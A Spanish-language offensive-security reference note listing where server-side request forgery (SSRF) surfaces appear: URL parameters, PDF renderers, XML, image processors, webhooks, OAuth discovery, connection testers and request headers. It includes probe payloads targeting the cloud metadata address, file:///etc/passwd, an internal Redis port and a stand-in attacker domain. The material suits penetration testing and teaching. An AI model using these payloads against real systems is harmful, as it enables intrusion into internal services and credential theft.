---
tipo: meta
aliases:
  - Superficies SSRF
  - Dónde nace un SSRF
tags:
  - meta/referencia
  - dominio/web
---

# SSRF superficies - matriz de referencia

> [!info] Referencia pura, no un zettel
> Catálogo de dónde aparece la superficie. El criterio de qué hacer una vez encontrada está en [[MOC - SSRF]]. Esta matriz es de reconocimiento: se recorre buscando, no se lee de corrido.

## 1. Parámetros con URL

El caso obvio, y el que ya está buscando todo el mundo. Nombres frecuentes:

```
url  uri  link  src  source  target  dest  destination
redirect  redirect_uri  return  returnTo  next  continue
feed  rss  data  reference  site  host  port  domain
image  image_url  img  avatar  photo  file  document
page  view  show  open  load  fetch  proxy  api  callback
```

Vale probar también **rutas parciales**: si el parámetro acepta `/interno/x` y la app le antepone un host, se prueba con `//atacante.com/x`, que en muchas bibliotecas se interpreta como host nuevo.

## 2. Superficies que no parecen SSRF

Las que pagan, porque nadie las revisa.

**Renderizadores de documentos.** Cualquier "exportar a PDF" que acepte HTML del usuario. El renderizador es un navegador completo del lado del servidor y obedece etiquetas:

`<img src="http://169.254.169.254/latest/meta-data/">`
`<iframe src="file:///etc/passwd">`
`<link rel=stylesheet href="http://interno:8080/">`
`<script>fetch('http://127.0.0.1:6379').then(r=>r.text()).then(t=>document.write(t))</script>`

El último es el más potente: con JavaScript habilitado, el renderizador lee la respuesta y la escribe en el PDF, lo que convierte un SSRF ciego en directo.

**Parsers de XML.** Toda subida de XML, DOCX, XLSX, SVG o SOAP es SSRF potencial vía entidades externas. Ver [[File upload - XXE por archivo]].

**Procesadores de imagen.** ImageMagick y las bibliotecas SVG siguen referencias externas. Un SVG con `<image href="http://...">` sale a la red durante la conversión.

**Webhooks.** El caso más limpio: la app pide una URL y promete llamarla. Casi siempre es ciego, y casi siempre no valida nada.

**Previsualización de enlaces.** Pegar una URL y que aparezca el título y la miniatura significa que el servidor la visitó.

**Descubrimiento de OAuth, OIDC y SAML.** URL de metadatos, `jwks_uri`, `issuer`, endpoint de aserción. Son URL controlables en el flujo de configuración de muchas integraciones, y las pide el servidor.

**Instaladores y validadores.** "Probar conexión" en un panel de administración —a una base, a un SMTP, a un almacenamiento S3— es SSRF con el host puesto por el usuario, y suele devolver el error del backend, que es un oráculo excelente.

## 3. Cabeceras

Cuando no hay parámetro, la superficie puede estar en la cabecera.

`Host: interno:8080`
Si el backend construye URL absolutas a partir del `Host`, cualquier trabajo diferido las usa.

`X-Forwarded-Host: atacante.com`
`X-Forwarded-For: 127.0.0.1`
`X-Original-URL: /admin`
Frecuentes detrás de proxies mal configurados. La segunda además sirve para saltar controles por IP.

`Referer: http://atacante.com/`
Los sistemas de analítica que visitan el referente son SSRF ciego regalado.

`GET http://interno:8080/ HTTP/1.1`
Petición con URL absoluta contra un servidor que se comporta como proxy sin saberlo. Vale probarlo siempre: cuesta una petición.

## 4. Confirmar la superficie

Antes de invertir en explotarla:

`http://<subdominio-único>.atacante.com/`
Servidor de interacción propio. Si llega la petición, hay SSRF. El subdominio debe ser **único por prueba** o la caché de DNS se come la segunda.

`http://127.0.0.1/`
`http://localhost/`
Prueba de loopback. Cualquier diferencia respecto de un host inexistente ya es un oráculo.

`http://[::1]/`
`http://0/`
Si `127.0.0.1` está en lista negra, estas dos suelen no estarlo.

`file:///etc/passwd`
Prueba de esquema. Si funciona, no hace falta red para nada.

> [!tip] Registrar qué superficie era
> El mismo SSRF explotado desde un webhook y desde un renderizador de PDF tiene techos distintos: el renderizador puede leer la respuesta, el webhook no. Anotarlo en el hallazgo cambia la severidad que se reporta.
